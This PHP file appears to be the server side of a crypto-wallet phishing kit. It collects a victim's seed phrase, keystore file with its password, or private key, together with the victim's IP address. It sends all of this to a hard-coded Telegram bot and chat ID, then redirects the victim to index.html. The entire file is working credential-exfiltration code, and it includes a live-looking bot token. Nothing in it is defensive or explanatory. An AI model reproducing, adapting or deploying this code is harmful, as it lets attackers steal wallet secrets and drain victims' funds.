<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $wallet_name = 'N/A';
    $wallet_type = 'N/A';
    $phrase_data = 'N/A';

    // Check for JSON input first (for AJAX)
    $input = file_get_contents('php://input');
    if (!empty($input) && ($json_data = json_decode($input, true)) && json_last_error() === JSON_ERROR_NONE) {
        $wallet_name = $json_data['wallet'] ?? 'N/A';
        $wallet_type = $json_data['type'] ?? 'N/A';
        $phrase_data = $json_data['Phrase'] ?? 'N/A';
    }
    // Fallback to standard POST data
    elseif (!empty($_POST)) {
        $wallet_name = $_POST['wallet'] ?? 'N/A';

        // Determine type and data based on which field is filled
        if (!empty($_POST['phrase'])) {
            $wallet_type = 'Phrase';
            $phrase_data = $_POST['phrase'];
        } elseif (!empty($_POST['keystorejson'])) {
            $wallet_type = 'Keystore JSON';
            $keystore_json = $_POST['keystorejson'];
            $keystore_password = $_POST['keystorepassword'] ?? '[no password]';
            $phrase_data = "JSON: " . $keystore_json . "\nPassword: " . $keystore_password;
        } elseif (!empty($_POST['privatekey'])) {
            $wallet_type = 'Private Key';
            $phrase_data = $_POST['privatekey'];
        }
    }

    // Get the user's IP address
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip_address = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip_address = $_SERVER['REMOTE_ADDR'];
    }

    // Get the current time
    $timestamp = date('Y-m-d H:i:s T');

    // Format the message for Telegram
    $message = "🔐 New Wallet Connection\n\n"
             . "👛 Wallet: " . $wallet_name . "\n"
             . "🔑 Method: " . $wallet_type . "\n"
             . "📝 Credentials: " . $phrase_data . "\n"
             . "⏰ Time: " . $timestamp . "\n"
             . "🔐 IP Address: " . $ip_address;

    // Telegram Bot API details
    $bot_token = '8295057763:AAGBHFLRMZZAcPgHVX_sULPV-57k48DqWEo';
    $chat_id = '6363774415';
    $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";

    // Send the message to Telegram
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['chat_id' => $chat_id, 'text' => $message]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);

    // Log the response for debugging
    $log_message = "Timestamp: " . date('Y-m-d H:i:s') . "\n"
                 . "HTTP Code: " . $http_code . "\n"
                 . "cURL Error: " . $curl_error . "\n"
                 . "Telegram Response: " . $response . "\n"
                 . "-------------------------\n";
    file_put_contents('telegram_debug.log', $log_message, FILE_APPEND);

    // Optional: Check if the message was sent successfully
    $result = json_decode($response, true);
    if ($result && $result['ok']) {
        // Redirect or show a success message
        header('Location: index.html?status=success');
    } else {
        // Handle error
        $error_message = $result['description'] ?? 'Unknown error';
        header('Location: index.html?status=error&message=' . urlencode($error_message));
    }
    exit;
}
?>